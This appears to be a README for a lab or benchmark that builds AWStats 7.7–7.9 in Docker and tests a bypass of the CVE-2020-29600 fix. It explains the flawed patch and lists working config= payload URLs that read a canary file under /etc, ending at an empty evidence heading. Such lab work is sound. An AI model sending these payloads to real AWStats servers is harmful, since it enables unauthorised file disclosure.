## Recipe bring-up (no committed images/source; AWStats git-cloned at pinned tags at build)
  PCB_FLAG=<token> docker compose --profile v0 --profile v1 up -d --build
  # Dockerfile: debian:bookworm-slim + apache2 + perl; git clone --depth 1 --branch <7.7|7.8|7.9>
  #             https://github.com/eldy/awstats.git -> /usr/lib/cgi-bin/awstats.pl (mod_cgid)
  # entrypoint: printf 'Include "%s"\n' "$PCB_FLAG" > /etc/pcb_canary/flag.conf  (UNDER /etc, a config
  #             search dir in 7.8, but NOT under /etc/awstats etc.), then exec apache2ctl -D FOREGROUND
  # `python3 oracle.py --run-gate` does the whole build -> up -> gate -> down cycle automatically.

## Defended boundary (patch.diff): CVE-2020-29600 fix (7.7 -> 7.8) comments out Read_Config's
##   File::Spec->rel2abs($SiteConfig) absolute-path fallback, so a FULL absolute config= path no
##   longer opens. INCOMPLETE: @PossibleConfigDir still lists "/etc", and the search loop opens
##   `$searchdir$SiteConfig`, so a PARTIAL path (no leading /etc, no `..`) opens /etc/<partial>.
##   7.9 closes it by removing "/etc" from @PossibleConfigDir.

## Payloads (sent with curl --path-as-is)
  original (CVE-2020-29600, full absolute) : /cgi-bin/awstats.pl?config=/etc/pcb_canary/flag.conf
  bypass   (CVE-2020-35176, partial path)  : /cgi-bin/awstats.pl?config=pcb_canary/flag.conf

## Read-exfil evidence (V1=7.8, partial-path payload) — FLAG reflected in the include error:
